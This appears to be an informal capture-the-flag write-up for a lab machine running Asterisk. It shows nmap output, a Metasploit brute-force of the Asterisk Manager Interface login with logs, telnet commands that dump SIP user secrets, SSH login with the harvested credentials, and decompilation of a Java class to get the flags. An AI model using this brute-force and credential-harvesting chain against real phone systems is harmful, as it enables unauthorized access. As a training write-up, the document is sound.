first lets find which services this machine is running :

//////////////////////

nmap -sC -sV 10.10.140.207            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 23:00 UTC
Nmap scan report for 10.10.140.207
Host is up (0.14s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fe:e3:52:06:50:93:2e:3f:7a:aa:fc:69:dd:cd:14:a2 (RSA)
|   256 9c:4d:fd:a4:4e:18:ca:e2:c0:01:84:8c:d2:7a:51:f2 (ECDSA)
|_  256 c5:93:a6:0c:01:8a:68:63:d7:84:16:dc:2c:0a:96:1d (ED25519)
80/tcp   open     http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Aster CTF
|_http-server-header: Apache/2.4.18 (Ubuntu)
1720/tcp open     h323q931?
2000/tcp open     cisco-sccp?
9418/tcp filtered git
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.44 seconds
(myenv) 

//////////////////////////////

looks like it has H.323 (Port 1720)

    Service: h323q931 (VoIP protocol)

this is the file that  i downloaded from the website : 

//////////////////////////////

cat output.pyc 
�
�A2_c@s�ddlZejd�ZdZeje�Zejd�r`e	e
e
 e
endZeje�Zejd�Zd	r�eejejeneGHdS(
i����NsHello!!t�476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722etASCIIit�476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21i"ii(pyfiglet_formatto0OO00toO00oOotbytestfromhextOOOo0tdecodeOooo000oti1ii1IiI1itOOooOOotI11ito0Ot
                                                                                            IiiIII111iItOot
O00oOoOoO0o0OO0oo0OO0ti1itOootiii1I1It
                      Oo0ooO0oo0oOI1i1iI1itII(((s
                                                 ./output.py<module>s


//////////////////////////////

The file output.pyc is a compiled Python bytecode file (.pyc), which is generated when a Python script (output.py) is executed or imported. Since it's not human-readable, we need to decompile it to understand its functionality

we used The command strings output.pyc | grep -oE '[0-9a-fA-F]{10,}' which performs two main actions to extract useful information from the compiled Python file (output.pyc): 



1. strings output.pyc

    Purpose: Extracts all human-readable strings from the binary .pyc file.

    Why?
    Compiled Python files (.pyc) contain bytecode, but often embed plaintext strings (like error messages, hardcoded data, or flags in CTFs).
    The strings command scans the file for sequences of printable characters (ASCII/Unicode).

2. grep -oE '[0-9a-fA-F]{10,}'

    Purpose: Filters the output to show only strings that look like hexadecimal values (10+ characters long).

        -o: Shows only the matching part of the string.

        -E: Enables extended regex syntax.

        [0-9a-fA-F]{10,}: Matches sequences of 10+ hex characters (digits 0-9 or letters a-f/A-F).


:

this is the result after using hash identifier https://hashes.com/en/tools/hash_identifier :

{//////////////////

Good job, user "admin" the open source framework for building communications, installed in the server.

Good job reverser, python is very cool!

////////////////}


now that we got a username lets search for asterisk in msfconsole:

we will find this module for bruteforcing : auxiliary/voip/asterisk_login

the only creds that we need to change are : these:

////////////////


msf6 auxiliary(voip/asterisk_login) > set RHOSTS 10.10.158.68
RHOSTS => 10.10.158.68
msf6 auxiliary(voip/asterisk_login) > set USERNAME admin
USERNAME => admin
msf6 auxiliary(voip/asterisk_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf6 auxiliary(voip/asterisk_login) > run

/////////////////////


the result : 


{///////////////

msf6 auxiliary(voip/asterisk_login) > run
[*] 10.10.158.68:5038     - Initializing module...
[*] 10.10.158.68:5038     - 10.10.158.68:5038 - Trying user:'admin' with password:'admin'
[*] 10.10.158.68:5038     - 10.10.158.68:5038 - Trying user:'admin' with password:'123456'
[*] 10.10.158.68:5038     - 10.10.158.68:5038 - Trying user:'admin' with password:'12345'
[*] 10.10.158.68:5038     - 10.10.158.68:5038 - Trying user:'admin' with password:'123456789'
[*] 10.10.158.68:5038     - 10.10.158.68:5038 - Trying user:'admin' with password:'password'
[*] 10.10.158.68:5038     - 10.10.158.68:5038 - Trying user:'admin' with password:'iloveyou'
[*] 10.10.158.68:5038     - 10.10.158.68:5038 - Trying user:'admin' with password:'princess'
[*] 10.10.158.68:5038     - 10.10.158.68:5038 - Trying user:'admin' with password:'1234567'
[*] 10.10.158.68:5038     - 10.10.158.68:5038 - Trying user:'admin' with password:'12345678'
[*] 10.10.158.68:5038     - 10.10.158.68:5038 - Trying user:'admin' with password:'abc123'
[+] 10.10.158.68:5038     - User: "admin" using pass: "abc123" - can login on 10.10.158.68:5038!
[!] 10.10.158.68:5038     - No active DB -- Credential data will not be saved!
[*] 10.10.158.68:5038     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(voip/asterisk_login) > 

////////////////////}

i was targeting port 5038, which is not SIP, but rather the Asterisk Manager Interface (AMI) —
 a separate service that Asterisk exposes for administration (not phone calls).

which is the one that nmap revealed



looks like we found a password : abc123


AMI (Asterisk Manager Interface) allows remote administration via TCP on port 5038.

It requires a username and password (often defined in /etc/asterisk/manager.conf).

The voip/asterisk_login module in Metasploit specifically brute-forces AMI login credentials.


lets try to login in AMI using this module :


////////////////

msf6 auxiliary(voip/asterisk_login) > run
[*] 10.10.158.68:5038     - Initializing module...
[*] 10.10.158.68:5038     - 10.10.158.68:5038 - Trying user:'admin' with password:'abc123'
[+] 10.10.158.68:5038     - User: "admin" using pass: "abc123" - can login on 10.10.158.68:5038!
[!] 10.10.158.68:5038     - No active DB -- Credential data will not be saved!
[*] 10.10.158.68:5038     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(voip/asterisk_login) > 

////////////////////

i found this prblm No active DB so ill try to activate my metasploit db 


, this did work so lets try loggin in using telnet since it can works 


lets type in the ip and port : 
////////////

telnet 10.10.158.68 5038

Trying 10.10.158.68...
Connected to 10.10.158.68.
Escape character is '^]'.
Asterisk Call Manager/5.0.2

/////////////////


now while its trying to connect lets type in our login info 

and hit enter after each one 

//////////////////

Action: Login
Username: admin
Secret: abc123


esponse: Success
Message: Authentication accepted

Event: FullyBooted
Privilege: system,all
Uptime: 5421
LastReload: 5421
Status: Fully Booted


/////////////// 

it worked 

now to type a cmnd this is the pattern that we gonna use : 

///////////////////

Action: ping
ping: sip show peers

Response: Success
Ping: Pong
Timestamp: 1746863838.725143

//////////////////////


since some cmnds wont work :

////////////////

Action: pwd
pwd: sip show peers

Response: Error
Message: Invalid/unknown command: pwd. Use Action: ListCommands to show available commands.

Action: ip a
ip a: sip show peers

Response: Error
Message: Invalid/unknown command: ip a. Use Action: ListCommands to show available commands.

//////////////////


lets see the list of availanle cmnds :

by typing this and hitting enter : 

////////////////

Action: ListCommands
ListCommands: sip show peers

//////////////////

if we tried to see the users we will find that there is a user and a password : 

action: Command
Command: sip show users

Response: Success
Message: Command output follows
Output: Username                   Secret           Accountcode      Def.Context      ACL  Forcerport
Output: 100                        100                               test             No   No        
Output: 101                        101                               test             No   No        
Output: harry                      p4ss#w0rd!#                       test             No   No        



//////////////


looks like thos creds are for ssh login :

lets try them :

///////////////

ssh harry@10.10.158.68
harry@10.10.158.68's password: 
Permission denied, please try again.
harry@10.10.158.68's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Wed Aug 12 14:25:25 2020 from 192.168.85.1
harry@ubuntu:~$ 

/////////////////


now we logged in 

the first flag : 

////////


harry@ubuntu:~$ ls
Example_Root.jar  user.txt
harry@ubuntu:~$ cat user.txt 
thm{bas1c_aster1ck_explotat1on}
harry@ubuntu:~$ 

/////////


the challenge says to reverse a file to get root.txt


after listing the directory we found an interesting jar file :

//////////////////


harry@ubuntu:~$ ls -la                    
total 56
drwxr-xr-x 6 harry harry    4096 May 10 01:39 .
drwxr-xr-x 3 root  root     4096 Aug 10  2020 ..
-rw------- 1 root  asterisk  171 Aug 10  2020 .asterisk_history
-rw------- 1 root  root     3117 Aug 12  2020 .bash_history
-rw-r--r-- 1 harry harry     220 Aug 10  2020 .bash_logout
-rw-r--r-- 1 harry harry    3771 Aug 10  2020 .bashrc
drwx------ 2 harry harry    4096 Aug 10  2020 .cache
-rw-rw-r-- 1 harry harry    1094 Aug 12  2020 Example_Root.jar
drwxrwxr-x 2 harry harry    4096 Aug 12  2020 META-INF
drwxrwxr-x 2 harry harry    4096 Aug 10  2020 .nano
-rw-r--r-- 1 harry harry     655 Aug 10  2020 .profile
drwxr-xr-x 3 root  root     4096 Aug 10  2020 .subversion
-rw-r--r-- 1 harry harry       0 Aug 10  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 harry harry      32 Aug 11  2020 user.txt
-rw-r--r-- 1 root  root      233 Aug 12  2020 .wget-hsts

////////////////////

lets extract it : 

////////

harry@ubuntu:~$ unzip Example_Root.jar -d extracted_jar
Archive:  Example_Root.jar
   creating: extracted_jar/META-INF/
  inflating: extracted_jar/META-INF/MANIFEST.MF  
  inflating: extracted_jar/Example_Root.class  
harry@ubuntu:~$ ls
Example_Root.jar  extracted_jar  META-INF  user.txt
harry@ubuntu:~$ cd extracted_jar/
harry@ubuntu:~/extracted_jar$ ls
Example_Root.class  META-INF

//////////////////

the Example_Root file looks like its compiled : 

lets try to decompile it :

javap -c -p Example_Root.class : 

we found this 

///////////////////


harry@ubuntu:~/extracted_jar$ javap -c -p Example_Root.class
Compiled from "Example_Root.java"
public class Example_Root {
  public Example_Root();
    Code:
       0: aload_0
       1: invokespecial #1                  // Method java/lang/Object."<init>":()V
       4: return

  public static boolean isFileExists(java.io.File);
    Code:
       0: aload_0
       1: invokevirtual #2                  // Method java/io/File.isFile:()Z
       4: ireturn

  public static void main(java.lang.String[]);
    Code:
       0: ldc           #3                  // String /tmp/flag.dat
       2: astore_1
       3: new           #4                  // class java/io/File
       6: dup
       7: aload_1
       8: invokespecial #5                  // Method java/io/File."<init>":(Ljava/lang/String;)V
      11: astore_2
      12: aload_2
      13: invokestatic  #6                  // Method isFileExists:(Ljava/io/File;)Z
      16: ifeq          47
      19: new           #7                  // class java/io/FileWriter
      22: dup
      23: ldc           #8                  // String /home/harry/root.txt
      25: invokespecial #9                  // Method java/io/FileWriter."<init>":(Ljava/lang/String;)V
      28: astore_3
      29: aload_3
      30: ldc           #10                 // String my secret <3 baby
      32: invokevirtual #11                 // Method java/io/FileWriter.write:(Ljava/lang/String;)V
      35: aload_3
      36: invokevirtual #12                 // Method java/io/FileWriter.close:()V
      39: getstatic     #13                 // Field java/lang/System.out:Ljava/io/PrintStream;
      42: ldc           #14                 // String Successfully wrote to the file.
      44: invokevirtual #15                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V
      47: goto          63
      50: astore_3
      51: getstatic     #13                 // Field java/lang/System.out:Ljava/io/PrintStream;
      54: ldc           #17                 // String An error occurred.
      56: invokevirtual #15                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V
      59: aload_3
      60: invokevirtual #18                 // Method java/io/IOException.printStackTrace:()V
      63: return
    Exception table:
       from    to  target type
          12    47    50   Class java/io/IOException
}


////////////////////////////

From the decompiled bytecode, this Example_Root.class appears to be a simple Java program that checks for a file and writes a secret message

if this file /tmp/flag.dat exist it will wright a secret message in /home/harry/root.txt


since both dont exist : 

///////////////

harry@ubuntu:~/extracted_jar$ ls -la /tmp/flag.dat
ls: cannot access '/tmp/flag.dat': No such file or directory
harry@ubuntu:~/extracted_jar$ cat /home/harry/root.txt
cat: /home/harry/root.txt: No such file or directory

/////////////////

lets create the first one and lauch the program to create the other : 

/////////////

and there is the file created 
harry@ubuntu:~/extracted_jar$ chmod 744 Example_Root.class 
harry@ubuntu:~/extracted_jar$ java Example_Root            
An error occurred.
java.io.FileNotFoundException: /home/harry/root.txt (Permission denied)
	at java.base/java.io.FileOutputStream.open0(Native Method)
	at java.base/java.io.FileOutputStream.open(FileOutputStream.java:298)
	at java.base/java.io.FileOutputStream.<init>(FileOutputStream.java:237)
	at java.base/java.io.FileOutputStream.<init>(FileOutputStream.java:126)
	at java.base/java.io.FileWriter.<init>(FileWriter.java:66)
	at Example_Root.main(Example_Root.java:17)
harry@ubuntu:~/extracted_jar$ cat /home/harry/root.txt
thm{fa1l_revers1ng_java}harry@ubuntu:~/extracted_jar$ Connection to 10.10.158.68 closed by remote host.


/////////////////////////////


